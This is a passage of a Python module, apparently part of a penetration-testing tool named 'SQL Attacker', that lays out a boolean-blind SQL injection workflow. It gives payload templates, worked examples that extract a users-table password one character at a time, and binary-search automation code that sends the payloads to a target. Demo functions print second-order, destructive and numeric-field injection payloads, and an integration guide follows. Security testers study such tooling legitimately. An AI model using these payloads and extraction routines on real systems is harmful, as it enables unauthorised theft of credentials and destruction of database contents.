                    ],
                    'confirmation': 'Different responses for true/false conditions'
                },
                {
                    'phase': '2. Determine Target Data',
                    'actions': [
                        'Identify what data to extract (username, password, etc.)',
                        'Determine table and column names',
                        'Identify WHERE clause for target row'
                    ],
                    'example': 'Extract admin password from users table'
                },
                {
                    'phase': '3. Extract Data Length',
                    'technique': 'Test different length values until true',
                    'payload_template': '1 AND LENGTH((SELECT {column} FROM {table} WHERE {condition}))={length}',
                    'example': '1 AND LENGTH((SELECT password FROM users WHERE id=1))=32',
                    'optimization': 'Use binary search: test 16, then 8 or 24, etc.'
                },
                {
                    'phase': '4. Extract Character-by-Character',
                    'technique': 'Binary search ASCII values for each position',
                    'payload_template': '1 AND ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {condition}),{position},1))>{value}',
                    'process': [
                        'Position 1: Test ASCII > 64 (if yes, search 65-126)',
                        'Continue binary search: test 96, 112, 120, etc.',
                        'Converge on exact ASCII value',
                        'Convert to character',
                        'Repeat for all positions'
                    ],
                    'example': [
                        '1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>64  [TRUE]',
                        '1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>96  [TRUE]',
                        '1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>112 [FALSE]',
                        '...continue until ASCII=102 (character "f")'
                    ]
                },
                {
                    'phase': '5. Reconstruct Data',
                    'actions': [
                        'Combine extracted characters',
                        'Verify extracted data makes sense',
                        'Decode if needed (hex, base64)'
                    ],
                    'example': 'Characters: [102,50,100,48...] → "f2d0..." → MD5 hash'
                }
            ],
            'efficiency_tips': [
                'Use binary search (7 requests) instead of linear (95 requests) per character',
                'Parallelize character extraction if possible',
                'Cache known values (table names, common strings)',
                'Use probabilistic approach for common characters (e, a, t)',
                'Extract multiple bytes in single query when possible'
            ],
            'automation': {
                'description': 'Automated extraction script pseudocode',
                'code': '''
def extract_string(url, param, table, column, where_clause):
    # Step 1: Get length
    length = binary_search_length(url, param, table, column, where_clause)
    
    # Step 2: Extract each character
    result = ""
    for position in range(1, length + 1):
        ascii_val = binary_search_ascii(url, param, table, column, position, where_clause)
        result += chr(ascii_val)
        print(f"Extracted: {result}")
    
    return result

def binary_search_ascii(url, param, table, column, position, where_clause):
    min_val, max_val = 32, 126
    while min_val <= max_val:
        mid = (min_val + max_val) // 2
        payload = f"1 AND ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {where_clause}),{position},1))>{mid}"
        response = send_request(url, param, payload)
        
        if is_true_response(response):
            min_val = mid + 1
        else:
            max_val = mid - 1
    
    return min_val
                '''
            }
        }


# Example usage and integration functions

def demo_second_order_injection():
    """
    Demonstration of second-order injection payload generation.
    
    This function shows how to use the SecondOrderInjection class
    for practical testing and exploitation.
    """
    print("=== Second-Order SQL Injection Demo ===\n")
    
    # Get scenarios
    for scenario_name, scenario in SecondOrderInjection.SCENARIOS.items():
        print(f"Scenario: {scenario_name}")
        print(f"Description: {scenario['description']}")
        print(f"Initial Payload: {scenario['step_1_payload']}")
        print(f"Impact: {scenario['impact']}")
        print("-" * 80)
        print()
    
    # Get payloads
    print("\n=== MySQL Second-Order Payloads ===")
    payloads = SecondOrderInjection.get_second_order_payloads(DBMSType.MYSQL)
    for category, payload_list in payloads.items():
        print(f"\n{category}:")
        for payload in payload_list[:3]:  # Show first 3
            print(f"  - {payload}")


def demo_destructive_queries():
    """
    Demonstration of destructive query payload generation.
    
    WARNING: For authorized testing only!
    """
    print("=== Destructive Query Demo (MySQL) ===\n")
    
    payloads = DestructiveQueries.get_destructive_payloads(DBMSType.MYSQL)
    
    for category, payload_list in payloads.items():
        print(f"\n{category.upper()}:")
        for item in payload_list:
            print(f"  Payload: {item['payload']}")
            print(f"  Description: {item['description']}")
            print(f"  Privileges: {item['privileges']}")
            print(f"  Impact: {item['impact']}")
            print()


def demo_numeric_exploitation():
    """
    Demonstration of numeric field exploitation techniques.
    """
    print("=== Numeric Field Exploitation Demo ===\n")
    
    # Show example payloads
    examples = NumericExploitation.get_numeric_exploitation_examples()
    for example in examples[:2]:  # Show first 2 scenarios
        print(f"Scenario: {example['scenario']}")
        print(f"Vulnerable Code: {example['vulnerable_code']}")
        print(f"Target: {example['target_data']}")
        print(f"\nStep 1: {example['step_1']['description']}")
        print(f"Payload: {example['step_1']['payload']}")
        print()
    
    # Generate test payloads
    print("\n=== MySQL Numeric Test Payloads ===")
    test_payloads = NumericExploitation.generate_test_payload_list(DBMSType.MYSQL)
    for payload in test_payloads[:10]:  # Show first 10
        print(f"  {payload}")


def get_integration_guide() -> str:
    """
    Get integration guide for incorporating this module into SQL Attacker.
    
    Returns:
        Markdown-formatted integration guide
    """
    return """
# SQL Attacker Second-Order Integration Guide

## Overview
This module provides advanced SQL injection techniques that complement the existing SQL Attacker engine.

## Integration Points

### 1. Second-Order Detection
Add to `sqli_engine.py`:
```python
from sql_attacker.sql_attacker_second_order_examples import SecondOrderInjection

# In SQLInjectionEngine class
def test_second_order(self, storage_endpoint, trigger_endpoint):
    payloads = SecondOrderInjection.get_second_order_payloads(self.dbms)
    # Submit payloads to storage endpoint
    # Trigger execution at trigger endpoint
    # Analyze results
```

### 2. Numeric Exploitation
Add to `advanced_payloads.py`:
```python
from sql_attacker.sql_attacker_second_order_examples import NumericExploitation

# In payload generation
def generate_numeric_payloads(self, target_param):
    return NumericExploitation.generate_test_payload_list(self.dbms)
```

### 3. Automated Extraction
Create new module `numeric_extractor.py`:
```python
from sql_attacker.sql_attacker_second_order_examples import NumericExploitation

class NumericExtractor:
    def extract_data(self, url, param, table, column):
        # Use binary search methods
        # Return extracted string
        pass
```

### 4. UI Integration
Add to `templates/sql_attacker/dashboard.html`:
- Second-order testing tab
- Numeric extraction tool
- Destructive query warning dialog

### 5. Test Integration
Add to test suite:
```python
from sql_attacker.sql_attacker_second_order_examples import (
    SecondOrderInjection,
    NumericExploitation
)

# Test payload generation
# Test extraction logic
```

## Configuration
Add to `settings.py`:
```python
SQL_ATTACKER_CONFIG = {
    'enable_second_order': True,
    'enable_numeric_extraction': True,
    'enable_destructive_payloads': False,  # Require explicit enable
}
```

## Safety Guidelines
1. Destructive payloads should require explicit user confirmation
2. Log all destructive operations for audit
3. Implement privilege level checks before enabling destructive features
4. Add warning dialogs for high-impact operations
"""


if __name__ == "__main__":
    """
    Main execution for demonstration and testing.
    """
    print("SQL Attacker - Advanced Techniques Module")
    print("=" * 80)
    print()
    
    # Run demonstrations
    demo_second_order_injection()
    print("\n" + "=" * 80 + "\n")
    
    demo_destructive_queries()
    print("\n" + "=" * 80 + "\n")
    
    demo_numeric_exploitation()
    print("\n" + "=" * 80 + "\n")
    
    # Show workflows
    print("=== Exploitation Workflows ===\n")
    workflow = ExploitationWorkflow.get_second_order_workflow()
    print(f"Title: {workflow['title']}")
    print(f"Overview: {workflow['overview']}\n")
    for step in workflow['steps'][:2]:  # Show first 2 phases
        print(f"{step['phase']}:")
        for action in step['actions']:
            print(f"  - {action}")
        print()
